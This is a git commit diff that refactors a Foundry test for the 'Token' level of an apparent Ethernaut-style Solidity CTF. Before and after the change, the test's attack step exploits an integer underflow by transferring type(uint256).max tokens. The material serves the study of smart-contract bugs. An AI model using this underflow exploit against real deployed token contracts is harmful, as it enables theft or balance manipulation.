d1b1ceb09e013faa058bdb1b1a54f73ad56f7dfc
karooolis <hello@karolisram.com>
2023-04-29 19:06:22 +0300

    refactor Token to use BaseTest helper

--- test/5-Token.t.sol
+++ test/5-Token.t.sol
@@ -2,26 +2,34 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
-import "../src/5-Token.sol";
+import "./utils/BaseTest.sol";
+import "../src/levels/5-Token/Token.sol";
+import "../src/levels/5-Token/TokenFactory.sol";
 
-contract TokenTest is Test {
-    Token public tokenCTF;
-    address attacker = address(0x01);
-    address receiver = address(0x02);
+contract TokenTest is Test, BaseTest {
+    Token public level;
 
-    function setUp() public {
-        tokenCTF = new Token(100);
+    constructor() {
+        levelFactory = new TokenFactory();
+    }
 
-        vm.startPrank(attacker);
-        vm.deal(attacker, 100 ether);
-        vm.label(attacker, "attacker");
-        vm.label(receiver, "receiver");
+    function setUp() public override {
+        super.setUp();
+        levelAddr = payable(_createLevelInstance());
+        level = Token(levelAddr);
     }
 
     function testAttack() public {
-        tokenCTF.transfer(receiver, 2 ** 256 - 1);
+        _attack();
+        _validateLevel();
+    }
 
-        assertEq(tokenCTF.balanceOf(attacker), 1);
-        assertEq(tokenCTF.balanceOf(receiver), 2 ** 256 - 1);
+    function _attack() internal override {
+        vm.startPrank(attacker);
+
+        // 1. Transfer tokens to some other address
+        level.transfer(address(0x1), type(uint256).max);
+
+        vm.stopPrank();
     }
 }
